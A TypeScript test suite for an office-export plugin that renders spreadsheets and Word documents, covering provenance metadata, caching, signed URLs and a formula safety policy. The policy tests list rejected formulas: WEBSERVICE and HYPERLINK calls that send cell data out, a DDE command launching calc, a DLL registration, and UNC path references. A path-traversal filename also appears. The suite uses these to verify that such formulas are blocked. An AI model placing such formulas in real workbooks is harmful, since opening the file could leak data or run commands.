import { describe, it } from 'node:test';
import { strict as assert } from 'node:assert';
import { Readable } from 'node:stream';
import ExcelJS from 'exceljs';
import type { TigrisStore } from '@omadia/diagrams';
import {
  renderXlsx,
  renderDocx,
  sanitizeFilename,
  signDocumentUrl,
  verifyDocumentSig,
  OfficeService,
  MEDIA_TYPE,
  PROVENANCE_CATEGORY,
  PROVENANCE_DESCRIPTION,
  PROVENANCE_KEYWORDS,
  PROVENANCE_PROP_AI_GENERATED,
  PROVENANCE_PROP_GENERATOR,
  PROVENANCE_PROP_STANDARD,
  OfficeUnsafeFormulaError,
  XlsxToolInputSchema,
  type XlsxDescriptor,
  type DocxDescriptor,
} from '@omadia/plugin-office';

/** Extract every file entry of an OOXML (zip) buffer as UTF-8 text. Mirrors the
 *  `unzipToMap` helper in profileBundle.test.ts — `.docx` exposes no reader, so
 *  the provenance assertions read the raw `docProps/*.xml` back out of the
 *  produced file rather than trusting the renderer input. */
async function unzipToText(buf: Buffer): Promise<Map<string, string>> {
  const yauzl = await import('yauzl');
  return new Promise((resolve, reject) => {
    yauzl.fromBuffer(buf, { lazyEntries: true }, (err, zf) => {
      if (err || !zf) return reject(err ?? new Error('cannot open buffer'));
      const out = new Map<string, string>();
      zf.readEntry();
      zf.on('entry', (entry) => {
        if (/\/$/.test(entry.fileName)) {
          zf.readEntry();
          return;
        }
        zf.openReadStream(entry, (e2, stream) => {
          if (e2 || !stream) return reject(e2 ?? new Error('no stream'));
          const chunks: Buffer[] = [];
          stream.on('data', (c: Buffer) => chunks.push(c));
          stream.on('end', () => {
            out.set(entry.fileName, Buffer.concat(chunks).toString('utf8'));
            zf.readEntry();
          });
          stream.on('error', reject);
        });
      });
      zf.on('end', () => resolve(out));
      zf.on('error', reject);
    });
  });
}

const SECRET = 'z'.repeat(32);

describe('office xlsx renderer', () => {
  const descriptor: XlsxDescriptor = {
    filename: 'offene posten',
    title: 'Offene Posten',
    sheets: [
      {
        name: 'Offene Posten',
        columns: [
          { key: 'datum', header: 'Datum', type: 'date' },
          { key: 'partner', header: 'Partner', type: 'text' },
          { key: 'betrag', header: 'Offener Betrag', type: 'currency', currency: 'EUR' },
        ],
        rows: [
          { datum: '2026-05-01', partner: 'Acme GmbH', betrag: 1234.5 },
          { datum: '2026-05-12', partner: 'Beta AG', betrag: 999 },
        ],
      },
    ],
  };

  it('renders a parseable workbook with headers, rows and number formats', async () => {
    const result = await renderXlsx(descriptor);
    assert.equal(result.mediaType, MEDIA_TYPE.xlsx);
    assert.equal(result.ext, 'xlsx');
    assert.equal(result.filename, 'offene posten.xlsx');
    assert.equal(result.rowsWritten, 2);

    const wb = new ExcelJS.Workbook();
    await wb.xlsx.load(result.buffer);
    const ws = wb.getWorksheet('Offene Posten');
    assert.ok(ws, 'worksheet exists');

    // Header row.
    assert.equal(ws.getCell('A1').value, 'Datum');
    assert.equal(ws.getCell('B1').value, 'Partner');
    assert.equal(ws.getCell('C1').value, 'Offener Betrag');

    // Data: currency is a real number (summable), date is a real Date.
    assert.equal(ws.getCell('C2').value, 1234.5);
    assert.ok(ws.getCell('A2').value instanceof Date, 'date cell coerced to Date');

    // Number format carries the euro symbol.
    assert.match(ws.getCell('C2').numFmt ?? '', /€/);
  });

  it('is deterministic — output is independent of the wall clock (#645)', async (t) => {
    // exceljs stamps each zip entry mtime from `new Date()` (no pin API), so
    // without the ooxmlNormalize pass two renders taken at different times
    // differ and the content-addressed cache key (sha256 of the bytes) is
    // unstable. Advance a mocked clock *between* the two renders — the opposite
    // of freezing it — so byte-equality proves the output no longer depends on
    // when it was produced, which is exactly what the officeService cache needs.
    t.mock.timers.enable({ apis: ['Date'] });
    try {
      t.mock.timers.setTime(1_700_000_000_000);
      const a = await renderXlsx(descriptor);
      t.mock.timers.setTime(1_811_000_000_000); // ~3.5 years later
      const b = await renderXlsx(descriptor);
      assert.ok(a.buffer.equals(b.buffer), 'wall-clock change must not change bytes');
    } finally {
      t.mock.timers.reset();
    }
  });

  it('carries AI-Act provenance in the core properties (read back from the file)', async () => {
    const result = await renderXlsx(descriptor);
    const wb = new ExcelJS.Workbook();
    await wb.xlsx.load(result.buffer);
    // Read the properties back out of the produced workbook, not the input.
    assert.equal(wb.description, PROVENANCE_DESCRIPTION);
    assert.equal(wb.keywords, PROVENANCE_KEYWORDS);
    assert.equal(wb.category, PROVENANCE_CATEGORY);
    // Provenance must not clobber the caller's own title.
    assert.equal(wb.title, 'Offene Posten');
  });

  it('counts rowsWritten across sheets', async () => {
    const multi: XlsxDescriptor = {
      sheets: [
        { name: 'A', columns: [{ key: 'x', header: 'X' }], rows: [{ x: 1 }, { x: 2 }, { x: 3 }] },
        { name: 'B', columns: [{ key: 'y', header: 'Y' }], rows: [{ y: 'a' }] },
      ],
    };
    const result = await renderXlsx(multi);
    assert.equal(result.rowsWritten, 4);
  });

  it('renders formula cells with cross-sheet references', async () => {
    const descriptor: XlsxDescriptor = {
      sheets: [
        {
          name: 'Data',
          columns: [
            { key: 'monat', header: 'Monat' },
            { key: 'betrag', header: 'Betrag', type: 'currency' },
          ],
          rows: [
            { monat: 'Jan', betrag: 100 },
            { monat: 'Feb', betrag: 200 },
          ],
        },
        {
          name: 'Pivot',
          columns: [
            { key: 'label', header: 'Label' },
            { key: 'summe', header: 'Summe', type: 'currency' },
          ],
          // Cross-sheet formula referencing the Data sheet.
          rows: [{ label: 'Gesamt', summe: { formula: 'SUM(Data!B2:B3)' } }],
        },
      ],
    };
    const result = await renderXlsx(descriptor);
    assert.equal(result.rowsWritten, 3); // 2 data + 1 pivot

    const wb = new ExcelJS.Workbook();
    await wb.xlsx.load(result.buffer);
    const pivot = wb.getWorksheet('Pivot');
    assert.ok(pivot, 'pivot sheet exists');
    const cell = pivot.getCell('B2'); // row 2, col B = "summe"
    const value = cell.value as { formula?: string } | undefined;
    const formula = cell.formula ?? value?.formula;
    assert.equal(formula, 'SUM(Data!B2:B3)', 'formula written verbatim');
  });

  it('renders computed (per-row formula) columns with {row} substitution', async () => {
    const descriptor: XlsxDescriptor = {
      sheets: [
        {
          name: 'Daten',
          columns: [
            { key: 'datum', header: 'Datum', type: 'date' },
            { key: 'betrag', header: 'Betrag', type: 'currency' },
            // Computed helper column — A{row} = the date column, per row.
            { key: 'monat', header: 'Monat', formula: 'TEXT(A{row},"YYYY-MM")' },
          ],
          rows: [
            { datum: '2026-01-15', betrag: 100 },
            { datum: '2026-02-20', betrag: 200 },
          ],
        },
      ],
    };
    const result = await renderXlsx(descriptor);
    assert.equal(result.rowsWritten, 2);

    const wb = new ExcelJS.Workbook();
    await wb.xlsx.load(result.buffer);
    const ws = wb.getWorksheet('Daten');
    assert.ok(ws);
    // "Monat" is column C; the two data rows are Excel rows 2 and 3.
    const f2 = (ws.getCell('C2').value as { formula?: string } | undefined)?.formula;
    const f3 = (ws.getCell('C3').value as { formula?: string } | undefined)?.formula;
    assert.equal(f2, 'TEXT(A2,"YYYY-MM")', 'row 2 → A2');
    assert.equal(f3, 'TEXT(A3,"YYYY-MM")', 'row 3 → A3');
  });

  // A formula cell's displayed value must come from the application that
  // computes it, never from the descriptor: omadia evaluates no formulas, so a
  // caller-supplied cache would be stored as if it were the computed figure.
  const cachedResultInput = {
    sheets: [
      {
        name: 'S',
        columns: [
          { key: 'a', header: 'A' },
          { key: 'b', header: 'B', type: 'number' },
        ],
        rows: [{ a: 'x', b: { formula: '1+1', result: 999 } }],
      },
    ],
  };

  it('never persists a descriptor-supplied formula result', async () => {
    // The tool boundary drops the cached value …
    const parsed = XlsxToolInputSchema.safeParse(cachedResultInput);
    assert.ok(parsed.success, 'a formula cell with a result is still valid input');
    assert.deepEqual(parsed.data.sheets[0]?.rows?.[0]?.['b'], { formula: '1+1' });

    // … and the renderer ignores one smuggled past the type (a direct caller).
    const result = await renderXlsx(cachedResultInput as unknown as XlsxDescriptor);
    const sheet = (await unzipToText(result.buffer)).get('xl/worksheets/sheet1.xml') ?? '';
    assert.match(sheet, /<c r="B2"[^>]*><f>1\+1<\/f><\/c>/, 'formula written with no cached value');
    assert.doesNotMatch(sheet, /<f>1\+1<\/f><v>/, 'no <v> next to the formula');
    assert.doesNotMatch(sheet, /<v>999<\/v>/, 'the supplied cache is not stored as any value');
  });

  it('asks the opening application to recalculate when the workbook holds a formula', async () => {
    const workbookXml = async (d: XlsxDescriptor): Promise<string> =>
      (await unzipToText((await renderXlsx(d)).buffer)).get('xl/workbook.xml') ?? '';

    const inlineFormula = await workbookXml({
      sheets: [{ name: 'S', columns: [{ key: 'a', header: 'A' }], rows: [{ a: { formula: 'SUM(1,2)' } }] }],
    });
    assert.match(inlineFormula, /<calcPr [^>]*fullCalcOnLoad="1"/);

    const computedColumn = await workbookXml({
      sheets: [
        {
          name: 'S',
          columns: [
            { key: 'a', header: 'A', type: 'number' },
            { key: 'b', header: 'B', formula: 'A{row}*2' },
          ],
          rows: [{ a: 1 }],
        },
      ],
    });
    assert.match(computedColumn, /<calcPr [^>]*fullCalcOnLoad="1"/);

    // A plain data export has nothing to compute; the flag would only make
    // Excel mark it as changed and ask to save on close.
    const plain = await workbookXml(descriptor);
    assert.match(plain, /<calcPr /);
    assert.doesNotMatch(plain, /fullCalcOnLoad/);
  });

  it('stays deterministic when the workbook holds formulas (#645)', async (t) => {
    // The recalculation flag is a constant, so it adds no wall-clock or
    // per-render bytes. It is set only for workbooks that hold a formula: the
    // cache tests below render formula-free descriptors, and making the flag
    // unconditional would change their bytes (and every stored object's key).
    const withFormulas: XlsxDescriptor = {
      sheets: [
        {
          name: 'Data',
          columns: [
            { key: 'betrag', header: 'Betrag', type: 'currency' },
            { key: 'doppelt', header: 'Doppelt', formula: 'A{row}*2' },
          ],
          rows: [{ betrag: 100 }, { betrag: 200 }],
        },
        {
          name: 'Pivot',
          columns: [{ key: 'summe', header: 'Summe' }],
          rows: [{ summe: { formula: 'SUM(Data!A2:A3)' } }],
        },
      ],
    };
    t.mock.timers.enable({ apis: ['Date'] });
    try {
      t.mock.timers.setTime(1_700_000_000_000);
      const a = await renderXlsx(withFormulas);
      t.mock.timers.setTime(1_811_000_000_000); // ~3.5 years later
      const b = await renderXlsx(withFormulas);
      assert.ok(a.buffer.equals(b.buffer), 'wall-clock change must not change bytes');
    } finally {
      t.mock.timers.reset();
    }
  });
});

describe('office formula policy — formulas stay inside the workbook', () => {
  // The opening application recalculates every formula (the workbook asks it
  // to), so a formula that can reach the network, another program or another
  // file would do so the moment someone opens the export.
  const oneFormula = (formula: string): XlsxDescriptor => ({
    sheets: [{ name: 'S', columns: [{ key: 'a', header: 'A' }], rows: [{ a: { formula } }] }],
  });

  const rejected: ReadonlyArray<readonly [formula: string, why: string, reason: RegExp]> = [
    ['WEBSERVICE("https://example.invalid/?q="&B1)', 'a URL fetch carrying cell data', /uses WEBSERVICE/],
    ['_xlfn.WEBSERVICE("https://example.invalid/")', 'the future-function prefix', /uses WEBSERVICE/],
    ['FILTERXML(webservice("https://example.invalid/"),"//a")', 'a lower-case nested call', /uses WEBSERVICE/],
    ['HYPERLINK("https://example.invalid/?q="&B1,"open")', 'a link carrying cell data', /uses HYPERLINK/],
    ['_xlfn.IMAGE("https://example.invalid/a.png")', 'an image fetch', /uses IMAGE/],
    ['RTD("server.progid",,"topic")', 'a COM real-time data server', /uses RTD/],
    ['REGISTER.ID("kernel32","GetTickCount","J")', 'a DLL registration', /uses REGISTER\.ID/],
    ['LET(f,WEBSERVICE,f("https://example.invalid/"))', 'a function passed as a value', /uses WEBSERVICE/],
    ["cmd|' /C calc'!A0", 'a DDE command', /DDE reference/],
    ['[1]Sheet1!A1', 'an external workbook by index', /bracketed reference/],
    ["'C:\\dir\\[book.xlsx]Sheet1'!A1", 'an external workbook by path', /bracketed reference/],
    ["'\\\\host\\share\\book.xlsx'!Total", 'a UNC path', /another file by its path/],
    ['IF(A1="x', 'an unterminated string literal', /unterminated quote/],
  ];

  for (const [formula, why, reason] of rejected) {
    it(`rejects ${why}`, async () => {
      await assert.rejects(renderXlsx(oneFormula(formula)), (err: unknown) => {
        assert.ok(err instanceof OfficeUnsafeFormulaError, `expected OfficeUnsafeFormulaError for ${formula}`);
        assert.equal(err.location, 'sheet "S", cell A2');
        assert.match(err.reason, reason);
        return true;
      });
    });
  }

  it('rejects a computed column template before any row is written', async () => {
    const descriptor: XlsxDescriptor = {
      sheets: [
        {
          name: 'S',
          columns: [
            { key: 'a', header: 'A' },
            { key: 'link', header: 'Link', formula: 'HYPERLINK("https://example.invalid/?r="&A{row})' },
          ],
          rows: [{ a: 'x' }],
        },
      ],
    };
    await assert.rejects(renderXlsx(descriptor), (err: unknown) => {
      assert.ok(err instanceof OfficeUnsafeFormulaError);
      assert.equal(err.location, 'sheet "S", computed column "link"');
      return true;
    });
  });

  it('keeps formulas that only compute over this workbook', async () => {
    const allowed = [
      'SUM(Data!B2:B3)',
      "SUMIFS('Offene Posten'!E:E,'Offene Posten'!C:C,A2)",
      "SUM('Jan:Dez'!B2)", // 3-D reference across sheets
      "'It''s'!A1", // escaped quote inside a sheet name
      'Image!A1', // a sheet that happens to be called Image
      'IF(A1="WEBSERVICE(x)|[y]\\\\z","a","b")', // text inside a string literal
      'YEAR(A2)&"-"&TEXT(MONTH(A2),"00")',
    ];
    for (const formula of allowed) {
      const result = await renderXlsx(oneFormula(formula));
      assert.equal(result.rowsWritten, 1, formula);
    }
  });
});

describe('office docx renderer', () => {
  it('renders a valid .docx (zip) from blocks', async () => {
    const descriptor: DocxDescriptor = {
      filename: 'bericht',
      title: 'Quartalsbericht',
      blocks: [
        { type: 'heading', level: 1, text: 'Zusammenfassung' },
        { type: 'paragraph', text: 'Dies ist ein Absatz.' },
        { type: 'bullets', items: ['Punkt eins', 'Punkt zwei'] },
        { type: 'table', headers: ['A', 'B'], rows: [['1', '2'], ['3', '4']] },
      ],
    };
    const result = await renderDocx(descriptor);
    assert.equal(result.mediaType, MEDIA_TYPE.docx);
    assert.equal(result.filename, 'bericht.docx');
    assert.equal(result.rowsWritten, 0);
    // OOXML is a zip — bytes start with the local-file-header magic "PK".
    assert.equal(result.buffer[0], 0x50);
    assert.equal(result.buffer[1], 0x4b);
    assert.ok(result.buffer.length > 1000, 'non-trivial document');
  });

  const provenanceDescriptor: DocxDescriptor = {
    filename: 'bericht',
    title: 'Quartalsbericht',
    blocks: [{ type: 'paragraph', text: 'Inhalt.' }],
  };

  it('carries AI-Act provenance in core + custom OOXML properties (read back from the file)', async () => {
    const result = await renderDocx(provenanceDescriptor);
    const entries = await unzipToText(result.buffer);

    // Core properties: human+machine readable description and keywords.
    const core = entries.get('docProps/core.xml') ?? '';
    assert.ok(core.includes(PROVENANCE_DESCRIPTION), 'dc:description carries provenance');
    assert.ok(core.includes(PROVENANCE_KEYWORDS), 'cp:keywords carries provenance');

    // Custom properties: the structured, machine-branchable flag.
    const custom = entries.get('docProps/custom.xml') ?? '';
    assert.ok(custom.includes(PROVENANCE_PROP_AI_GENERATED), 'AIGenerated property present');
    assert.ok(custom.includes(PROVENANCE_PROP_GENERATOR), 'Generator property present');
    assert.ok(custom.includes(PROVENANCE_PROP_STANDARD), 'ProvenanceStandard property present');
    // The flag's value is the literal "true" a parser branches on.
    assert.match(custom, /name="AIGenerated"[^>]*>\s*<vt:lpwstr>true<\/vt:lpwstr>/);
  });

  it('is deterministic — output is independent of the wall clock (#645)', async (t) => {
    // docx v9 stamps dcterms:created/modified in core.xml *and* the zip entry
    // mtimes from `new Date()`, with no API to pin either — the ooxmlNormalize
    // pass rewrites both to a fixed epoch. Advancing a mocked clock between the
    // two renders proves the bytes no longer depend on wall-clock time, so the
    // sha256 cache key in officeService is stable across re-renders.
    t.mock.timers.enable({ apis: ['Date'] });
    try {
      t.mock.timers.setTime(1_700_000_000_000);
      const a = await renderDocx(provenanceDescriptor);
      t.mock.timers.setTime(1_811_000_000_000); // ~3.5 years later
      const b = await renderDocx(provenanceDescriptor);
      assert.ok(a.buffer.equals(b.buffer), 'wall-clock change must not change bytes');

      // The dcterms timestamps are pinned to the epoch, not to either mocked
      // wall-clock value — this is what makes the two renders identical.
      const core = (await unzipToText(a.buffer)).get('docProps/core.xml') ?? '';
      assert.match(core, /<dcterms:created[^>]*>1970-01-01T00:00:00\.000Z<\/dcterms:created>/);
      assert.match(core, /<dcterms:modified[^>]*>1970-01-01T00:00:00\.000Z<\/dcterms:modified>/);
    } finally {
      t.mock.timers.reset();
    }
  });
});

describe('office content-addressed cache (#645 AC#2)', () => {
  // Counts writes so we can assert the second render of the same descriptor is
  // served from the cache instead of re-stored under a fresh key.
  class CountingStore implements TigrisStore {
    puts = 0;
    private objects = new Set<string>();
    exists(key: string): Promise<boolean> {
      return Promise.resolve(this.objects.has(key));
    }
    put(key: string): Promise<void> {
      this.puts += 1;
      this.objects.add(key);
      return Promise.resolve();
    }
    getStream(): Promise<{ stream: Readable; contentType: undefined; contentLength: undefined }> {
      return Promise.resolve({ stream: Readable.from(''), contentType: undefined, contentLength: undefined });
    }
  }

  function serviceWith(store: TigrisStore): OfficeService {
    return new OfficeService({
      store,
      secret: SECRET,
      publicBaseUrl: 'https://bot.example.com',
      tenantId: 'dev',
      signedUrlTtlSec: 60,
    });
  }

  it('re-rendering the same xlsx descriptor hits the cache across a wall-clock gap', async (t) => {
    // The whole point of ooxmlNormalize: without it the two renders below get
    // different bytes → different sha → a second write, defeating dedup. Move
    // the clock forward between them to prove the cache key is time-stable.
    const store = new CountingStore();
    const svc = serviceWith(store);
    const descriptor = { sheets: [{ name: 'S', columns: [{ key: 'a', header: 'A' }], rows: [{ a: 1 }] }] };

    t.mock.timers.enable({ apis: ['Date'] });
    try {
      t.mock.timers.setTime(1_700_000_000_000);
      const first = await svc.createXlsx(descriptor);
      t.mock.timers.setTime(1_811_000_000_000);
      const second = await svc.createXlsx(descriptor);

      assert.equal(first.cacheHit, false, 'first render stores');
      assert.equal(second.cacheHit, true, 'second render is a cache hit');
      assert.equal(store.puts, 1, 'byte-identical re-render is stored exactly once');
    } finally {
      t.mock.timers.reset();
    }
  });

  it('re-rendering the same docx descriptor hits the cache across a wall-clock gap', async (t) => {
    const store = new CountingStore();
    const svc = serviceWith(store);
    const descriptor: DocxDescriptor = {
      filename: 'bericht',
      blocks: [{ type: 'paragraph', text: 'Inhalt.' }],
    };

    t.mock.timers.enable({ apis: ['Date'] });
    try {
      t.mock.timers.setTime(1_700_000_000_000);
      const first = await svc.createDocx(descriptor);
      t.mock.timers.setTime(1_811_000_000_000);
      const second = await svc.createDocx(descriptor);

      assert.equal(first.cacheHit, false, 'first render stores');
      assert.equal(second.cacheHit, true, 'second render is a cache hit');
      assert.equal(store.puts, 1, 'byte-identical re-render is stored exactly once');
    } finally {
      t.mock.timers.reset();
    }
  });
});

describe('office signed-url roundtrip', () => {
  function parse(url: string): { key: string; exp: number; sig: string } {
    const u = new URL(url);
    const key = decodeURIComponent(u.pathname.replace(/^\/documents\/dl\//, ''));
    return {
      key,
      exp: Number(u.searchParams.get('exp')),
      sig: u.searchParams.get('sig') ?? '',
    };
  }

  it('signs and verifies a fresh url', () => {
    const url = signDocumentUrl({
      key: 'documents/dev/abc/report.xlsx',
      secret: SECRET,
      ttlSec: 3600,
      publicBaseUrl: 'https://bot.example.com',
      nowSec: 1000,
    });
    const { key, exp, sig } = parse(url);
    assert.equal(key, 'documents/dev/abc/report.xlsx');
    assert.ok(verifyDocumentSig({ key, exp, sig, secret: SECRET, nowSec: 1000 }));
  });

  it('rejects expired urls', () => {
    const url = signDocumentUrl({
      key: 'documents/dev/abc/report.xlsx',
      secret: SECRET,
      ttlSec: 60,
      publicBaseUrl: 'https://bot.example.com',
      nowSec: 1000,
    });
    const { key, exp, sig } = parse(url);
    assert.equal(verifyDocumentSig({ key, exp, sig, secret: SECRET, nowSec: 9999 }), false);
  });

  it('rejects tampered keys', () => {
    const url = signDocumentUrl({
      key: 'documents/dev/abc/report.xlsx',
      secret: SECRET,
      ttlSec: 60,
      publicBaseUrl: 'https://bot.example.com',
      nowSec: 1000,
    });
    const { exp, sig } = parse(url);
    assert.equal(
      verifyDocumentSig({ key: 'documents/dev/abc/OTHER.xlsx', exp, sig, secret: SECRET, nowSec: 1000 }),
      false,
    );
  });
});

describe('office filename sanitizer', () => {
  it('appends the extension and keeps a readable base', () => {
    assert.equal(sanitizeFilename('Offene Posten', 'xlsx', 'export'), 'Offene Posten.xlsx');
  });
  it('strips path separators and a redundant extension', () => {
    const out = sanitizeFilename('../../etc/report.xlsx', 'xlsx', 'export');
    assert.ok(!out.includes('/') && !out.includes('\\'), 'no path separators survive');
    assert.ok(out.endsWith('.xlsx') && !out.endsWith('.xlsx.xlsx'), 'single correct extension');
  });
  it('falls back when empty', () => {
    assert.equal(sanitizeFilename('', 'docx', 'document'), 'document.docx');
    assert.equal(sanitizeFilename(undefined, 'docx', 'document'), 'document.docx');
  });
});
